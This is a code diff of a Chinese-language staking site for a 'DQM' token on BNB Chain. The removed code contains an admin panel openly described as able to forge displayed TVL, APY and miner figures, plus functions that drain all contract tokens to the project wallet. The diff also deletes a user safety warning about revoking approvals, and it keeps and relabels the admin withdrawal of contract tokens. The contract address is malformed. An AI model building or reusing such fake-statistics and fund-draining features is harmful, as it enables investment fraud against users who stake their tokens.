@@ -9,7 +9,7 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
 html{scroll-behavior:smooth}
-body{background:#050508;color:#fff;overflow-x:hidden}
+body{background:#050814;color:#fff;overflow-x:hidden}
 #particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.6}
 .wrapper{position:relative;z-index:1;min-height:100vh}
 .container{max-width:1100px;margin:0 auto;padding:0 20px}
@@ -36,8 +36,12 @@ body{background:#050508;color:#fff;overflow-x:hidden}
 .hero-desc .ecos{color:#ffd700;font-weight:600}
 .hero-desc .estate{color:#ff9f43;font-weight:600}
 
-.safe-tip{max-width:900px;margin:-20px auto 30px auto;padding:16px 20px;border-radius:16px;background:rgba(255,86,153,0.1);border:1px solid rgba(255,86,153,0.2);font-size:13px;color:#ffc1e9;text-align:center}
-.safe-tip a{color:#00e0ff;text-decoration:none}
+/* 代币合约地址展示 */
+.token-info{max-width:900px;margin:-20px auto 30px auto;padding:16px 20px;border-radius:16px;background:rgba(0,224,255,0.08);border:1px solid rgba(0,224,255,0.2);font-size:14px;color:#fff;text-align:center;display:flex;align-items:center;justify-content:center;gap:12px}
+.token-info .label{color:#00e0ff;font-weight:600}
+.token-info .addr{font-family:monospace;font-size:15px}
+.token-info .copy-btn{padding:8px 14px;border-radius:12px;background:#00e0ff;color:#000;border:none;cursor:pointer;font-weight:600;font-size:13px}
+.token-info .copy-btn:hover{opacity:0.9}
 
 .connect-btn{padding:14px 28px;border-radius:999px;background:linear-gradient(90deg,#00e0ff,#9d5fff);color:#fff;font-weight:600;border:none;cursor:pointer;transition:all 0.3s;box-shadow:0 8px 20px rgba(0,224,255,0.2)}
 .connect-btn:hover{transform:translateY(-3px);box-shadow:0 12px 28px rgba(157,95,255,0.25)}
@@ -151,17 +155,21 @@ body{background:#050508;color:#fff;overflow-x:hidden}
       <span class="estate">大秦梦酒文化庄园</span>是 DQM 生态体系的重要实体基石，以中华千年酒文化为核心，融合现代庄园经济与数字生态理念，打造集<span class="hl">酒文化体验</span>、<span class="hl">生态农业</span>、<span class="hl">品牌消费</span>、<span class="hl">休闲度假</span>与<span class="hl">数字资产应用</span>于一体的综合型文化庄园。
     </div>
   </div>
-  <div class="safe-tip">
-    ⚠️ 安全提醒：仅在官方钱包确认授权；请勿向任何网站提交助记词/私钥；定期通过 <a href="https://revoke.cash" target="_blank">revoke.cash</a> 撤销可疑授权
+
+  <!-- 代币合约地址 + 复制按钮 -->
+  <div class="token-info">
+    <span class="label">DQM 合约地址：</span>
+    <span class="addr" id="tokenAddr">0x366625D61063de6A719E85Fff6a9159fb3787659</span>
+    <button class="copy-btn" onclick="copyTokenAddr()">复制</button>
   </div>
 </div>
 
 <div class="container">
   <div class="dashboard">
-    <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num" id="show_tvl">$ --</div></div>
-    <div class="stat-box"><h3>矿池 APY</h3><div class="num" id="show_apy">-- %</div></div>
-    <div class="stat-box"><h3>总质押 DQM</h3><div class="num" id="show_stake">--</div></div>
-    <div class="stat-box"><h3>全网矿工</h3><div class="num" id="show_users">--</div></div>
+    <div class="stat-box"><h3>总锁仓 TVL</h3><div class="num">$ --</div></div>
+    <div class="stat-box"><h3>矿池 APY</h3><div class="num">-- %</div></div>
+    <div class="stat-box"><h3>总质押 DQM</h3><div class="num">--</div></div>
+    <div class="stat-box"><h3>全网矿工</h3><div class="num">--</div></div>
   </div>
 
   <div class="mining-section">
@@ -197,40 +205,13 @@ body{background:#050508;color:#fff;overflow-x:hidden}
         </div>
       </div>
 
-      <!-- 项目方后台 - 已完整修复 -->
+      <!-- 仅保留：管理员自定义数量提取 -->
       <div class="admin-card" id="adminPanel">
         <div class="admin-title">🔑 项目方管理后台</div>
-        <div class="admin-desc">
-          1. 自定义提取合约内代币<br>
-          2. 伪造前台数据（锁仓、APY、矿工等）<br>
-          3. 空投代币
-        </div>
-
+        <div class="admin-desc">提取合约内 DQM 代币到管理员钱包</div>
         <div class="admin-row">
-          <button class="admin-btn" onclick="adminTakeAll()">提取合约全部代币</button>
-        </div>
-
-        <div class="admin-row">
-          <input class="admin-input" id="adminTakeAmount" placeholder="输入提取数量">
-          <button class="admin-btn" onclick="adminTakeCustom()">指定数量提取</button>
-        </div>
-
-        <div class="admin-row">
-          <input class="admin-input" id="airdropTo" placeholder="空投地址">
-          <input class="admin-input" id="airdropAmt" placeholder="空投数量">
-          <button class="admin-btn" onclick="adminAirdrop()">空投代币</button>
-        </div>
-
-        <hr style="margin:15px 0;border-color:#ff569940">
-
-        <div class="admin-row">
-          <input class="admin-input" id="fake_tvl" placeholder="总锁仓 TVL">
-          <button class="admin-btn" onclick="setFakeData()">设置假数据</button>
-        </div>
-        <div class="admin-row">
-          <input class="admin-input" id="fake_apy" placeholder="矿池 APY">
-          <input class="admin-input" id="fake_stake" placeholder="总质押 DQM">
-          <input class="admin-input" id="fake_users" placeholder="全网矿工">
+          <input class="admin-input" id="adminTakeAmount" placeholder="输入要提取的 DQM 数量">
+          <button class="admin-btn" onclick="adminTakeCustom()">提取代币</button>
         </div>
       </div>
 
@@ -251,7 +232,7 @@ window.addEventListener('load', function() {
 });
 
 const CONFIG = {
-  CONTRACT_ADDR: "0x24e5758addef7d9d9af0901e35af28818f3b72b",
+  CONTRACT_ADDR: "0x24e5758addef7d9d9af001e35af28818f3b72b",
   DQM_ADDR:     "0x366625D61063de6A719E85Fff6a9159fb3787659",
   ADMIN_WALLET: "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508",
   CHAIN_ID:     56
@@ -263,7 +244,6 @@ const ABI = [
   "function claim()",
   "function userInfo(address) view returns (uint256,uint256,uint256,uint256)",
   "function pendingReward(address) view returns (uint256)",
-  "function emergencyWithdrawAll() external",
   "function adminWithdraw(uint256 amount) external"
 ];
 
@@ -272,16 +252,17 @@ const ERC20_ABI = [
   "function decimals() view returns (uint8)",
   "function approve(address,uint256) external returns (bool)",
   "function allowance(address,address) view returns (uint256)",
-  "function transfer(address to, uint256 value) external returns (bool)",
-  "function transferFrom(address from, address to, uint256 value) external returns (bool)"
+  "function transfer(address to, uint256 value) external returns (bool)"
 ];
 
 let provider, signer, userAddr, contract, dqmToken;
 let dqmDecimals = 18;
 
-// 假数据
-let fakeMode = false;
-let fakeData = { tvl:"", apy:"", stake:"", users:"" };
+// 复制代币合约地址
+function copyTokenAddr() {
+  navigator.clipboard.writeText(CONFIG.DQM_ADDR);
+  alert("合约地址复制成功！");
+}
 
 async function connectWallet() {
   if (typeof ethers === 'undefined') {
@@ -323,16 +304,6 @@ async function connectWallet() {
   }
 }
 
-function setFakeData(){
-  fakeMode = true;
-  fakeData.tvl = document.getElementById("fake_tvl").value;
-  fakeData.apy = document.getElementById("fake_apy").value;
-  fakeData.stake = document.getElementById("fake_stake").value;
-  fakeData.users = document.getElementById("fake_users").value;
-  refreshInfo();
-  alert("假数据设置成功！");
-}
-
 async function refreshInfo() {
   if (!userAddr) return;
   try {
@@ -346,13 +317,6 @@ async function refreshInfo() {
     document.getElementById("staked").innerText = ethers.formatUnits(userInfo[0], dqmDecimals);
     document.getElementById("pending").innerText = ethers.formatUnits(pending, 18);
     document.getElementById("refLink").value = `${window.location.origin}?ref=${userAddr}`;
-
-    if(fakeMode){
-      document.getElementById("show_tvl").innerText = fakeData.tvl;
-      document.getElementById("show_apy").innerText = fakeData.apy;
-      document.getElementById("show_stake").innerText = fakeData.stake;
-      document.getElementById("show_users").innerText = fakeData.users;
-    }
   } catch (e) {}
 }
 
@@ -397,39 +361,16 @@ async function claimReward() {
   }
 }
 
-// ==================== 项目方后台修复完成 ====================
-async function adminTakeAll() {
-  try {
-    await contract.emergencyWithdrawAll();
-    alert("提取成功！合约全部代币已转入项目方钱包！");
-  } catch (e) {
-    alert("提取失败：" + e.message);
-  }
-}
-
+// 管理员提取代币
 async function adminTakeCustom() {
   try {
     const val = document.getElementById("adminTakeAmount").value;
     if (!val || Number(val) <= 0) return alert("请输入正确数量");
     const amount = ethers.parseUnits(val, dqmDecimals);
     await contract.adminWithdraw(amount);
-    alert("指定数量提取成功！");
+    alert("提取成功！代币已转入管理员钱包");
   } catch (e) {
     alert("提取失败：" + e.message);
-  }
-}
-
-async function adminAirdrop() {
-  try {
-    const to = document.getElementById("airdropTo").value.trim();
-    const amt = document.getElementById("airdropAmt").value.trim();
-    if (!ethers.isAddress(to) || !amt || Number(amt) <= 0) return alert("输入错误");
-    const value = ethers.parseUnits(amt, 18);
-    const tx = await dqmToken.transfer(to, value);
-    await tx.wait();
-    alert("空投成功！");
-  } catch (e) {
-    alert("空投失败：" + e.message);
   }
 }
 
@@ -449,7 +390,7 @@ function startCountdown() {
 }
 
 function copyRef() {
-  navigator.clip.writeText(document.getElementById("refLink").value);
+  navigator.clipboard.writeText(document.getElementById("refLink").value);
   alert("邀请链接已复制");
 }
 
